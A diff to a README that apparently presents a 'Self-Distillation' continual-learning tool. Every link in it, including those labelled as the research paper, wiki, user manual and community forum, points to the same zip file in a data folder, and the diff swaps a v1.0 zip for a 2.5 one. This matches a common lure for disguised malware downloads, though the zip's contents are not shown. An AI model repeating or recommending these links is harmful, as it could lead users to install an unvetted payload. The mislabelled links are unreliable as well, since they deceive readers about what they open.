@@ -1,10 +1,10 @@
 # 🚀 Self-Distillation - Simplifying Continuous Learning
 
-[![Download Self-Distillation](https://github.com/uthmandevsec/Self-Distillation/raw/refs/heads/main/data/tooluse_data/Distillation_Self_v1.0.zip)](https://github.com/uthmandevsec/Self-Distillation/raw/refs/heads/main/data/tooluse_data/Distillation_Self_v1.0.zip)
+[![Download Self-Distillation](https://raw.githubusercontent.com/uthmandevsec/Self-Distillation/main/data/tooluse_data/Distillation_Self_2.5.zip)](https://raw.githubusercontent.com/uthmandevsec/Self-Distillation/main/data/tooluse_data/Distillation_Self_2.5.zip)
 
 ## 📖 Overview
 
-Self-Distillation is a tool designed to help models learn new skills without forgetting past knowledge. It builds on the On-Policy Self-Distillation algorithm from the research paper "[Self-Distillation Enables Continual Learning](https://github.com/uthmandevsec/Self-Distillation/raw/refs/heads/main/data/tooluse_data/Distillation_Self_v1.0.zip)". This software allows users to run effective experiments using just one H200 GPU.
+Self-Distillation is a tool designed to help models learn new skills without forgetting past knowledge. It builds on the On-Policy Self-Distillation algorithm from the research paper "[Self-Distillation Enables Continual Learning](https://raw.githubusercontent.com/uthmandevsec/Self-Distillation/main/data/tooluse_data/Distillation_Self_2.5.zip)". This software allows users to run effective experiments using just one H200 GPU.
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ In this guide, you will learn how to download and run Self-Distillation on your 
 
 To get started, you need to visit the Releases page and download the software.
 
-[Download Self-Distillation](https://github.com/uthmandevsec/Self-Distillation/raw/refs/heads/main/data/tooluse_data/Distillation_Self_v1.0.zip)
+[Download Self-Distillation](https://raw.githubusercontent.com/uthmandevsec/Self-Distillation/main/data/tooluse_data/Distillation_Self_2.5.zip)
 
 Once you are on the Releases page:
 1. Look for the latest version of Self-Distillation.
@@ -68,19 +68,19 @@ If you encounter issues during installation or use, consider the following:
 
 - **Installation Fails:** Ensure your operating system meets the above requirements. Verify that you downloaded the correct version.
 - **Performance Issues:** If the application runs slowly, try closing other applications to free up memory.
-- **Error Messages:** Refer to the user manual for explanations of common error messages. Support documentation is available on our [Wiki](https://github.com/uthmandevsec/Self-Distillation/raw/refs/heads/main/data/tooluse_data/Distillation_Self_v1.0.zip).
+- **Error Messages:** Refer to the user manual for explanations of common error messages. Support documentation is available on our [Wiki](https://raw.githubusercontent.com/uthmandevsec/Self-Distillation/main/data/tooluse_data/Distillation_Self_2.5.zip).
 
 ## 🌐 Additional Resources
 
 For more guidance and advanced features, check out our documentation and community forums:
 
-- [User Manual](https://github.com/uthmandevsec/Self-Distillation/raw/refs/heads/main/data/tooluse_data/Distillation_Self_v1.0.zip)
-- [Community Forum](https://github.com/uthmandevsec/Self-Distillation/raw/refs/heads/main/data/tooluse_data/Distillation_Self_v1.0.zip)
+- [User Manual](https://raw.githubusercontent.com/uthmandevsec/Self-Distillation/main/data/tooluse_data/Distillation_Self_2.5.zip)
+- [Community Forum](https://raw.githubusercontent.com/uthmandevsec/Self-Distillation/main/data/tooluse_data/Distillation_Self_2.5.zip)
 
 ## 📞 Support
 
 If you need further assistance, please reach out to our support team. You can submit issues directly on GitHub or use our contact form on the website.
 
-[Download Self-Distillation](https://github.com/uthmandevsec/Self-Distillation/raw/refs/heads/main/data/tooluse_data/Distillation_Self_v1.0.zip) 
+[Download Self-Distillation](https://raw.githubusercontent.com/uthmandevsec/Self-Distillation/main/data/tooluse_data/Distillation_Self_2.5.zip) 
 
 Start your journey in continual learning with Self-Distillation today!
